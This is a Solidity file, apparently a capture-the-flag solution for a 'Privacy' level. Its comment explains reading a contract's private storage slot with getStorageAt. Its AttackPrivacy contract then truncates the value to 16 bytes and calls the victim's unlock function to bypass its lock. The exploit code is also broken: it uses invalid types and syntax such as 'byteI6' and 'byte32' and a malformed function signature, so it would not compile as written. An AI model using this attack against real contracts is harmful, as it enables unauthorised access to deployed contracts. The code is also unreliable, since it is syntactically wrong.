/**
The EVM stores state variable in byte32 slots, thus any variable than byte32 has to be compacted e.g 
uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  which will fill up index[2] of the instance of contract privacy =  await web3.eth.getStorageAt(instance, 2).

  Thus data[2] will be at index[5] which is the 6th storage position = await web3.eth.getStorageAt(instance, 5) as detailed on 
  attackPrivacy.js



Contract privacy.unlock receives a byte16 input, thus the storage at index 5 which is typed byte32 has to be truncated  
 */


pragma solidity ^ 0.6 .0;

contract AttackPrivacy {
    //var data = await web3.eth.getStorageAt(instance, 5);
    bytes32 data;


    function privacyAttack(address _victim, byte32 data) public {

        byteI6 public key = byte16(byte32 data);
        bytes memory payload = abi.encodeWithSignature("unlock(byte16)", key);
        (bool success, ) = address(_victim).call(payload);
    }

}